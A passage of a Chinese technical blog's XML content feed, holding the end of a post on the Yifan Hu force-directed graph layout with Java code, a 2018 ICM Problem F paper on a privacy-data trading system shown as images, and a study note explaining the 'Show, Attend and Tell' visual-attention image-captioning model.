class="line">66</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">    public void goAlgo() &#123;</div><div class="line">        graph = graphModel.getGraphVisible();</div><div class="line">        graph.readLock();</div><div class="line">        try &#123;</div><div class="line">            Node[] nodes = graph.getNodes().toArray();</div><div class="line">            for (Node n : nodes) &#123;</div><div class="line">                if (n.getLayoutData() == null || !(n.getLayoutData() instanceof ForceVector)) &#123;</div><div class="line">                    n.setLayoutData(new ForceVector());</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // Evaluates n^2 inter node forces using BarnesHut.</div><div class="line">            QuadTree tree = QuadTree.buildTree(graph, getQuadTreeMaxLevel());</div><div class="line"></div><div class="line">            //        double electricEnergy = 0; ///////////////////////</div><div class="line">            //        double springEnergy = 0; ///////////////////////</div><div class="line">            BarnesHut barnes = new BarnesHut(getNodeForce());</div><div class="line">            barnes.setTheta(getBarnesHutTheta());</div><div class="line">            for (Node node : nodes) &#123;</div><div class="line">                ForceVector layoutData = node.getLayoutData();</div><div class="line"></div><div class="line">                ForceVector f = barnes.calculateForce(node, tree);</div><div class="line">                layoutData.add(f);</div><div class="line">                //            electricEnergy += f.getEnergy();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // Apply edge forces.</div><div class="line">            for (Edge e : graph.getEdges()) &#123;</div><div class="line">                if (!e.getSource().equals(e.getTarget())) &#123;</div><div class="line">                    Node n1 = e.getSource();</div><div class="line">                    Node n2 = e.getTarget();</div><div class="line">                    ForceVector f1 = n1.getLayoutData();</div><div class="line">                    ForceVector f2 = n2.getLayoutData();</div><div class="line"></div><div class="line">                    ForceVector f = getEdgeForce().calculateForce(n1, n2);</div><div class="line">                    f1.add(f);</div><div class="line">                    f2.subtract(f);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // Calculate energy and max force.</div><div class="line">            energy0 = energy;</div><div class="line">            energy = 0;</div><div class="line">            double maxForce = 1;</div><div class="line">            for (Node n : nodes) &#123;</div><div class="line">                ForceVector force = n.getLayoutData();</div><div class="line"></div><div class="line">                energy += force.getNorm();</div><div class="line">                maxForce = Math.max(maxForce, force.getNorm());</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // Apply displacements on nodes.</div><div class="line">            for (Node n : nodes) &#123;</div><div class="line">                if (!n.isFixed()) &#123;</div><div class="line">                    ForceVector force = n.getLayoutData();</div><div class="line"></div><div class="line">                    force.multiply((float) (1.0 / maxForce));</div><div class="line">                    getDisplacement().moveNode(n, force);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            postAlgo();</div><div class="line">        &#125; finally &#123;</div><div class="line">            graph.readUnlockAll();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="简而析之：-1"><a href="#简而析之：-1" class="headerlink" title="简而析之："></a><strong>简而析之：</strong></h3><p><strong>1.建四叉树</strong><br><strong>2.将图中的节点放进去</strong><br><strong>3.对每个节点通过BarnesHut算法进行全局斥力的计算</strong><br><strong>4.对每个节点通过与之相连的点进行局部引力的计算</strong><br><strong>5.计算一下初始布局的能量和最大力</strong><br><strong>6.将引力和斥力组成合力对节点进行移动</strong><br><strong>7.判断是否达到平衡，是否要有正反馈更新步长</strong></p>
<p><strong>循环至布局稳定或达到迭代次数</strong></p>
<blockquote>
<p>引力的计算(n1,n2都为坐标向量)：<br><strong> public class SpringForce extends AbstractForce</strong><br>/<em>Fa = (n2 - n1) x||n2 - n1|| / K </em>/</p>
<p>斥力的计算(n1,n2都为坐标向量)：<br><strong>public class ElectricalForce extends AbstractForce</strong><br>/<em>Fr = -C x K x K x (n2-n1) / ||n2-n1||</em>/<br>=&gt; 其中<strong>C</strong>即为<strong>2.relativeStrength</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/yfh_1.png" alt=""></p>
<blockquote>
<p><strong>“A creative man is motivated by the desire to achieve, not by the desire to beat others.”</strong><br>– Ayn Rand<br><strong>So will I be finally.</strong><br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Social Network Layout </category>
            
            <category> Network Optimization </category>
            
            <category> Yifanhu </category>
            
        </categories>
        
        
        <tags>
            
            <tag> [object Object] </tag>
            
            <tag> Force-Directed Algorithms </tag>
            
            <tag> Barnes–Hut Force Calculation </tag>
            
            <tag> Quadtree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(贻笑大方的论文)A Dynamic Privacy Trading System]]></title>
      <url>http://yikunhaocong.com/2018/03/17/2018-ICM-F/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>2018 MCM/ICM Problem F : <a href="http://op72m4y17.bkt.clouddn.com/2018_ICM_Problem_F.pdf" target="_blank" rel="external">http://op72m4y17.bkt.clouddn.com/2018_ICM_Problem_F.pdf</a></strong><p></p>
<p><strong>在此再次感谢XC和GS两位好兄弟的通力合作，有付出就会有收获</strong><br><strong>心存敬畏，不忘初心</strong></p>
<p>Desription:<br>As we are stepping into an era of “big data”, private information has become<br>increasingly important, making it necessary to develop a PI trading system. </p>
<p>In this paper,<br>we design a PI trading system with three kinds of roles, which are private data owners,<br>group of privacy data collectors and data miners.<br><a id="more"></a></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/0001.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0002.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0003.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0004.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0005.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0006.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0007.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0008.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0009.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0010.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0011.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0012.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0013.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0014.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0015.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0016.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0017.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0018.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0019.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0020.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0021.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0022.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0023.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0024.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0025.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0026.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0027.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0028.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0029.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/0030.jpg" alt=""></p>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 2018美国ICM建模论文(F题) </category>
            
            <category> 2018-ICM-F题 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> (AP)SIR模型 </tag>
            
            <tag> K-Means++ </tag>
            
            <tag> K-Anonymity </tag>
            
            <tag> Multi-arms Bandit Problems </tag>
            
            <tag> Upper Bounded Confidence(UBC) </tag>
            
            <tag> VarUBC </tag>
            
            <tag> 个人信息动态交易平台 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ICML 2015 | Show, Attend and Tell——Neural Image Caption Generation with Visual Attention]]></title>
      <url>http://yikunhaocong.com/2018/01/20/Visual-Attention/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br><strong>希望结合自身已有的知识和相关文献，将论文以一种全面而简洁、明确而有趣的方式重新演绎一遍，亦当知识点复习。</strong><br><a href="http://202.38.196.91/cache/7/03/www.jmlr.org/1711a288cfc28455f7a1963b65d656c6/xuc15.pdf" target="_blank" rel="external">“Show, Attend and Tell: Neural Image Caption Generation with Visual Attention.”<br>Kelvin Xu, Jimmy Ba, Ryan Kiros, Kyunghyun Cho, Aaron Courville, Ruslan Salakhutdinov, Richard Zemel, Yoshua Bengio</a><br><a id="more"></a><p></p>
<p>Xu K, Ba J, Kiros R, et al. Show, attend and tell: Neural image caption generation with visual attention[C]//International Conference on Machine Learning. 2015: 2048-2057.</p>
<h2 id="请用PC端浏览器打开"><a href="#请用PC端浏览器打开" class="headerlink" title="请用PC端浏览器打开"></a>请用PC端浏览器打开</h2><p><strong>手机浏览器不支持Google Chart的Latex公式图片生成，变量公式图片可能无法正常显示</strong></p>
<h2 id="先预览一下论文模型的成果"><a href="#先预览一下论文模型的成果" class="headerlink" title="先预览一下论文模型的成果"></a>先预览一下论文模型的成果</h2><h4 id="输入一张图片，基本准确地输出一句描述"><a href="#输入一张图片，基本准确地输出一句描述" class="headerlink" title="输入一张图片，基本准确地输出一句描述"></a>输入一张图片，基本准确地输出一句描述</h4><p><img src="http://op72m4y17.bkt.clouddn.com/SAT_1.png" alt=""></p>
<h4 id="注意力-Attention-机制聚焦不同区域对应的输出"><a href="#注意力-Attention-机制聚焦不同区域对应的输出" class="headerlink" title="注意力(Attention)机制聚焦不同区域对应的输出"></a>注意力(Attention)机制聚焦不同区域对应的输出</h4><p><img src="http://op72m4y17.bkt.clouddn.com/SAT_5.png" alt=""></p>
<h4 id="模型对比，可见当年Hard-Attention性能拔得头筹"><a href="#模型对比，可见当年Hard-Attention性能拔得头筹" class="headerlink" title="模型对比，可见当年Hard-Attention性能拔得头筹"></a>模型对比，可见当年Hard-Attention性能拔得头筹</h4><p><img src="http://op72m4y17.bkt.clouddn.com/SAT_3.png" alt=""></p>
<h2 id="这篇论文的基石"><a href="#这篇论文的基石" class="headerlink" title="这篇论文的基石"></a>这篇论文的基石</h2><h3 id="「Show-and-Tell」——图像标注（Image-Caption）任务"><a href="#「Show-and-Tell」——图像标注（Image-Caption）任务" class="headerlink" title="「Show and Tell」——图像标注（Image Caption）任务"></a>「Show and Tell」——图像标注（Image Caption）任务</h3><p>Image Caption，就是从图片中自动生成一段描述性文字，有点类似于我们小时候做过的“看图说话”。对于机器来说难度在于检测物体+理解相互关系+用适当的语言表达</p>
<h3 id="Encoder-Decoder结构"><a href="#Encoder-Decoder结构" class="headerlink" title="Encoder-Decoder结构"></a>Encoder-Decoder结构</h3><p>“最原始的RNN结构中，输入序列和输出序列必须是严格等长的。但在机器翻译等任务中，源语言句子的长度和目标语言句子的长度往往不同，因此我们需要将原始序列映射为一个不同长度的序列。Encoder-Decoder模型就解决了这样一个长度不一致的映射问题。”</p>
<ul>
<li>简而言之，就是建立一个embedding(嵌入)向量空间，将每一个词表示为这个向量空间中的一个唯一的向量，即同时满足injective(单射性，x(词)和y(向量)唯一对应)和structure-preserving(结构保存,可以理解为两个词向量空间上的几何距离远近和词义的远近满足一致性)</li>
</ul>
<p>RNN的Encoder将所有的输入“编码”成一个固定的向量表示，然后Decoder在每一步都会利用它来“译码”并输出合适的单词序列,如下所示<br><img src="http://op72m4y17.bkt.clouddn.com/SAT_7.jpg" alt="Encoder-Decoder结构"></p>
<h3 id="Show-and-Tell-A-Neural-Image-Caption-Generator"><a href="#Show-and-Tell-A-Neural-Image-Caption-Generator" class="headerlink" title="Show and Tell: A Neural Image Caption Generator"></a>Show and Tell: A Neural Image Caption Generator</h3><p>“机器翻译任务中，输入输出都是单词序列，而在Image Caption任务中，输入是图像，输出是单词序列，所以只需要将原来的Encoder RNN换成图像中使用的CNN结构，为图像提取一个“视觉特征”I，然后还是使用Decoder将这个I解码为输出序列就可以了，这就是论文《Show and Tell: A Neural Image Caption Generator》中的想法”</p>
<ul>
<li>“这篇论文可是说是Image Caption任务早期的开山之作，它把Encoder-Decoder结构做了简单修改，就在Image Caption任务上取得了较好的结果，下图是这篇论文中网络的具体结构。先看提取图像特征的CNN部分，由于这篇论文是谷歌出品的，因此这部分就使用了自家的Inception模型。再看Decoder部分，将RNN换成了性能更好的LSTM，输入还是word embedding，每步的输出是单词表中所有单词的概率，这些都是标准做法了，就不再赘述。<br><img src="http://op72m4y17.bkt.clouddn.com/SAT_8.jpg" alt="采用CNN提取特征和LSTM的结构"></li>
</ul>
<blockquote>
<p>若对以上内容存在疑惑，可以进这里补补知识<br>    <a href="https://zhuanlan.zhihu.com/p/27771046" target="_blank" rel="external">1.「Show and Tell」——图像标注（Image Caption）任务技术综述</a><br>    <a href="http://blog.csdn.net/heyongluoyao8/article/details/48636251" target="_blank" rel="external">2.循环神经网络(RNN, Recurrent Neural Networks)介绍</a><br>    <a href="https://www.jianshu.com/p/9dc9f41f0b29" target="_blank" rel="external">3.[译] 理解 LSTM 网络</a></p>
</blockquote>
<h2 id="这篇论文的模型"><a href="#这篇论文的模型" class="headerlink" title="这篇论文的模型"></a>这篇论文的模型</h2><ul>
<li>有一篇CSDN博客对这篇论文的模型进行较为详细的讲解，但是仍有不足之处(在某些说明上有有一些模糊不清的逻辑)<a href="http://blog.csdn.net/shenxiaolu1984/article/details/51493673#fn:3" target="_blank" rel="external">【图像理解】之Show, attend and tell算法详解</a>，因此本文会在此博文的基础上+原论文再引入更加形象细致的说明来完整表示整个模型。<h3 id="模型输入输出"><a href="#模型输入输出" class="headerlink" title="模型输入输出"></a>模型输入输出</h3><h2 id="请用PC端浏览器打开-1"><a href="#请用PC端浏览器打开-1" class="headerlink" title="请用PC端浏览器打开"></a>请用PC端浏览器打开</h2><strong>手机浏览器不支持Google Chart的Latex公式图片生成，变量公式图片可能无法正常显示</strong><br>输入：图像 I (彩色图像)</li>
</ul>
<p>特征(annotation)：{<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{1}...a_{i}...a_{L}" alt="">}</p>
<p>上下文(context)：{<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{1}...z_{t}...z_{C}" alt="">}</p>
<p>输出(caption)：{<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=y_{1}...y_{t}...y_{C}" alt="">}</p>
<p><img src="http://img.blog.csdn.net/20160525112848323" alt="论文模型"></p>
<p><strong>有顺序的<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=y_{t}" alt="">组成一句“说明”(caption)。句子长度C不定。每个单词<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=y_{t}" alt="">是一个K维概率，K是词典的大小。</strong></p>
<p><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{i}" alt=""><strong>是一个D维特征，共有L个，描述图像的不同区域。</strong></p>
<p><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}" alt=""><strong>也是一个D维特征，共有C个，表示每个单词对应的上下文。</strong></p>
<ul>
<li>释义<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{i}" alt="">是一次生成的，但单词<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}" alt="">是逐个生成的，所以使用下标t来强调每一次估计。<ul>
<li>1.<strong>怎么理解？</strong>简而言之就是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{i}" alt="">到<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{L}" alt="">这L个向量是在输入图片后通过CNN卷积就能得到的L个特征，这里与以往卷积提取的是最后一个全连接层的总体特征不同，这L个特征是用比较低层级的卷积得到的局部区域特征。也就是相当于把图片平均分为L个区域，模型使用的是L=14*14=196个区域，维度为512(也就是提取图片512个通道的信息)，<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{1}" alt="">代表的是图像第一个局部区域的特征向量也叫注释向量，以此类推。</li>
<li>2.而<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}" alt="">这个上下文向量可以这样理解，由于模型使用了Attention机制，顾名思义就是每次识别图像的时候会聚焦在某个局部区域的对象，<strong>所以<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{1}" alt="">表示的是在t1时刻所聚焦的一个图像区域，<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{2}" alt="">表示的是在t2时刻所聚焦的一个图像区域…以此类推。</strong>值得说明的一点是，<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}" alt="">是该时刻<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{1}...a_{i}...a_{L}" alt="">注释向量的加权总和，更形象的解释是，权重越大的部分越被注意到，因此实际上它可能同时聚焦某几个区域(有些区域的权重可能一样)。<h3 id="模型上下文生成"><a href="#模型上下文生成" class="headerlink" title="模型上下文生成 "></a>模型上下文生成 <img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a\overset{\alpha}{\rightarrow}z" alt=""></h3>如上面第二点所说，上下文向量<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}" alt="">和<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a_{i}" alt="">维度相同都为D，而且前者是后者的加权和，权重为<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={\alpha}_{t}" alt="">,表示第t刻对应的权重，计算公式为：<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=z_{t}={\alpha_{t}}^{T}\cdot{a}" alt=""></li>
</ul>
</li>
</ul>
<p><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={\alpha}_{t}" alt="">的维度为L=196，也就是对应一张图片的196个局部区域，记录对应的注释向量位置所获得的关注</p>
<ul>
<li><p><strong>CSDN博客里的讲解中说的是每个像素位置获得的关注，实际上应该严谨一点说成每个局部区域位置获得的关注</strong></p>
</li>
<li><p><strong>那么问题来了，权重向量<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={\alpha}_{t}" alt="">怎么获得？</strong> </p>
</li>
</ul>
<p>第一步权重完全由图像特征<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=a" alt="">决定：<br><img src="http://img.blog.csdn.net/20160813104012944" alt=""><br>接下来的每一步中，权重<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={\alpha}_{t}" alt="">都由t-1时刻的隐变量<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=h_{t-1}" alt=""><br>经过若干全连接层获得,如图所示：<br><img src="http://img.blog.csdn.net/20160813194310596" alt=""><br><strong>其中<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=e_{t-1}" alt="">代表直到t-1时刻已经存储的信息，fc里包含的是一系列需要通过训练优化的参数</strong></p>
<ul>
<li>系统的隐变量以及它衍生出来的LSTM单元里面的各个向量维度都相同都为m，在论文中没给出具体维度，但我们可以假设为m = 256维度</li>
</ul>
<h3 id="关键-隐变量生成"><a href="#关键-隐变量生成" class="headerlink" title="(关键)隐变量生成 "></a>(关键)隐变量生成 <img src="http://op72m4y17.bkt.clouddn.com/SAT_6.png" alt=""></h3><p><strong>一图说明流程足矣</strong></p>
<p><img src="http://img.blog.csdn.net/20160813110405462" alt=""></p>
<ul>
<li>如果对LSTM已经有所了解的话，这个图非常直观<ul>
<li><strong>输入i，输出o，遗忘f，候选g，还有一个存储c,都为m维向量</strong><h2 id="请用PC端浏览器打开-2"><a href="#请用PC端浏览器打开-2" class="headerlink" title="请用PC端浏览器打开"></a>请用PC端浏览器打开</h2><strong>手机浏览器不支持Google Chart的Latex公式图片生成，变量公式图片可能无法正常显示</strong><br>“存储c是LSTM的核心，由前一词的存储和当前候选g加权得到，遗忘门f控制前一词存储，输入门i控制本次候选，公式如下：</li>
</ul>
</li>
</ul>
<p><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=c_{t}={c}_{t-1}\odot{f}_{t}" alt="">+<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={i}_{t}\odot{g}_{t}" alt=""></p>
<p><strong>隐状态h由存储经过变化得到，强度由输出门o控制：</strong></p>
<p><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=h_{t}={o}_{t}\odot{tanh}{c}_{t}" alt=""></p>
<p><strong>整个LSTM构造如下:</strong><br><img src="http://img.blog.csdn.net/20160813190912583" alt=""></p>
<h3 id="句子生成"><a href="#句子生成" class="headerlink" title="句子生成 "></a>句子生成 <img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=h_{}\overset{NN}{\rightarrow}y_{}" alt=""></h3><ul>
<li><strong>NN指的是Neural Network</strong>，当前隐变量h通过全连网络生成当前单词y，如图所示：<br><img src="http://img.blog.csdn.net/20160813191330819" alt=""></li>
</ul>
<h3 id="重点-带着问题回顾一下整个模型"><a href="#重点-带着问题回顾一下整个模型" class="headerlink" title="(重点)带着问题回顾一下整个模型"></a>(重点)带着问题回顾一下整个模型</h3><p><img src="http://img.blog.csdn.net/20160813200110335" alt=""></p>
<blockquote>
<p><strong>第一个问题：<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={z}_{t}" alt="">为什么和<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt="">的维度不一样？</strong></p>
<p><strong>第二个问题:对于此模型而言，Encoder和Decoder分别是哪一部分的实现？</strong></p>
<p><strong>第三个问题:LSTM里的隐变量<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt="">究竟蕴含着什么内容？</strong></p>
<p><strong>第四个问题:<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt="">是如何“译码”生成t时刻单词<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={y}_{t}" alt="">的？</strong></p>
</blockquote>
<ul>
<li><strong>对于以上问题，建议多看几遍原论文代入推敲一下，毕竟读论文最重要的是带着问题去思考而不是单纯地记录，这样才能发现更有价值的东西</strong></li>
</ul>
<h3 id="几个问题的剖析"><a href="#几个问题的剖析" class="headerlink" title="几个问题的剖析"></a>几个问题的剖析</h3><ul>
<li><p>可以说这几个问题让我思索了挺久，以下是我个人的见解，可能不代表论文本身观点，如果有发现不对，请对照原论文给出充分的理由证明</p>
<ul>
<li>先看一下原论文里的LSTM结构：</li>
</ul>
</li>
</ul>
<p><img src="http://op72m4y17.bkt.clouddn.com/SATT2.png" alt="LSTM"><br><img src="http://op72m4y17.bkt.clouddn.com/SATT1.png" alt="LSTM"></p>
<p><strong>这里的W、U、Z、b分别是对应LSTM不同部分通过训练会学习到的权重参数和偏置</strong></p>
<p>从上面的式子就可以看出，每个权重参数都是对应每个向量的维度而训练生成的，<strong>首先根据这一点可以先断定维度不同对于模型的训练是毫不影响的</strong>。那么<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={z}_{t}" alt=""> 维度为m=196，而<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt=""> 维度为n=256(原论文没给具体值，但是m和n是不同的，这两者维度的设置分别意味着什么呢？</p>
<p>这个问题的答案可以同时解决第一个和第三个问题</p>
<blockquote>
<p>首先，<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={z}_{t}" alt=""> 是基于<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}...{a}_{i}...{a}_{L}" alt="">的维度生成的，因为它要表示图片的上下文向量，通俗地讲就是要表示出图片要聚焦的某个部分，所以它是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}...{a}_{i}...{a}_{L}" alt="">加权后的向量，<strong>试想一下，当t时刻<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}" alt="">权重为0.9，而其它195个局部区域部分的权重相加为0.1，那<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={z}_{t}" alt="">是不是就相当于90%的<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}" alt="">向量+10%的其它向量，此处就可以近似地看成<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={z}_{t}" alt="">是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}" alt="">的一个表示，也就是此刻图像要聚焦的部分。</strong>那有人可能要提出疑问：就算是90%的<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}" alt="">向量，可是还有10%的其它向量相加，你怎么能够确保它相加后还是接近<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={a}_{1}" alt="">的表示呢？</p>
</blockquote>
<p><strong>答案是肯定的，因为这就是embedding嵌入空间的一个特性：structure-preserving(结构保存,可以理解为两个词向量空间上的几何距离远近和本义的远近满足一致性),这个嵌入空间是通过深度学习网络学习出来的，具备这个特性。我可以举个更形象的例子，NLP里面的word2vec实际上也是把每个词embedding嵌入到某个固定维度的向量空间里，满足单射性injective和这个特性,因此如果想知道两个词的词义远近，可以通过直接计算两个词向量的距离，同样，图像词义(图像和标题描述)的embedding也是如此，就算存在10%的影响，这个向量还是非常接近90%的表示</strong></p>
<blockquote>
<p>那 <img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt=""> 这个n=256维度的隐含向量究竟表示的是啥呢？</p>
</blockquote>
<p><strong>可以理解为跟t-1时刻图像语义相关的下一时刻的256个图像语义！</strong><br>同样，光说无凭，那么就附上原论文的公式：</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/SATT_4.png" alt="LSTM"></p>
<p><strong>看到了吗？</strong> <img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={L}_{h}\epsilon\mathbb{R}^{m\times{n}}" alt=""><br>n维的<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl={h}_{t}" alt=""> 会最终转换为m维的注释向量(图像语义)。<strong>更简单形象地说，我们可以把h看作是跟上下文向量z有关的256个注释向量(图像语义)的独热one-hot编码(为了简化，实际上它是多位编码)，它是经过LSTM单元的记忆、过滤(强度控制)而输出的，可以直接对应生成描述性单词y，而c是中间记忆产物用于下一次生成h的思考(形象一点就是它能够联系上下文，它存的就是从一开始到现在尽可能保留的但没过滤过的内容，而h是更简洁的记忆表示，因此叫做隐含层)，所有部分(包括f,i,g,o)都是为了输出一个准确而合理的h而存在的</strong></p>
<p><img src="http://img.blog.csdn.net/20160813190912583" alt=""></p>
<ul>
<li>总而言之，h就是先经过“译码”把“多位编码”(第i位的1代表第i个图像语义要输出，0代表不需要，h可以看成是一个0/1编码的256维向量)转换为注释向量(图像语义)，<strong>然后再转换为一个输出该语义各单词的概率，再把最大概率的单词输出</strong></li>
</ul>
<p>看到这里，第一个第二个第三个第四个问题就都解决了</p>
<ul>
<li><p>Encoder是将图像各个区域特征转换为注释向量(图像语义)的CNN网络，原论文用的是Oxford VGGnet (Simonyan &amp; Zisserman, 2014)</p>
</li>
<li><p>Decoder是(循环神经网络)LSTM单元，h是LSTM中各记忆门、输出门、输入门、候选门第一次“译码”后得到的隐含向量(表示相关图像语义的集合的向量)，而经过第二次“译码”就成功翻译为与图像上下文语义相关的描述性单词(这里是通过概率最大化输出)</p>
</li>
<li><p>Attention则是用在h生成的上下文向量z,它使得h能够聚焦于图像的某一个部分而不是所有，一方面能够动态更新h里面隐含的信息而不是像SRNs那样把所有前面的信息全部隐含进来，因此有助于扩大h表示的范围；另一方面，它很好的模拟了人类的视觉直觉，使得图像描述的生成更加具有智能化，可以再看一张图：</p>
</li>
</ul>
<p><img src="http://op72m4y17.bkt.clouddn.com/SAT_2.png" alt=""></p>
<p><strong>人类会因为直觉而识别错某个物体，这个模型做到了，它的直觉不是凭空想象，而是类似于人类的直觉(将相像的物体误认了)，这个错误识别的结果实际上在侧面反映了这个模型的强大，它已经能够利用注意力机制来产生图像识别的直觉</strong></p>
<h2 id="与论文相关的一些开源-我的和其他的"><a href="#与论文相关的一些开源-我的和其他的" class="headerlink" title="与论文相关的一些开源(我的和其他的)"></a>与论文相关的一些开源(我的和其他的)</h2><p><strong>原作者开源的模型代码(Theano/Caffe框架构建)</strong><br><a href="https://github.com/kelvinxu/arctic-captions" target="_blank" rel="external">https://github.com/kelvinxu/arctic-captions</a></p>
<p><strong>基于Tensorflow框架的模型开源代码(我跑的是这个)</strong><br><a href="https://github.com/yunjey/show-attend-and-tell" target="_blank" rel="external">https://github.com/yunjey/show-attend-and-tell</a></p>
<p><strong>我对原论文的全文翻译+模型实现细节+修改后的代码仓库</strong><br><a href="https://github.com/Kali-Hac/Show-Attend-and-Tell-Neural-Image-Caption-Generation-with-Visual-Attention" target="_blank" rel="external">https://github.com/Kali-Hac/Show-Attend-and-Tell-Neural-Image-Caption-Generation-with-Visual-Attention</a></p>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 论文研读笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CNN/RNN-LSTM </tag>
            
            <tag> Attention Mechanism </tag>
            
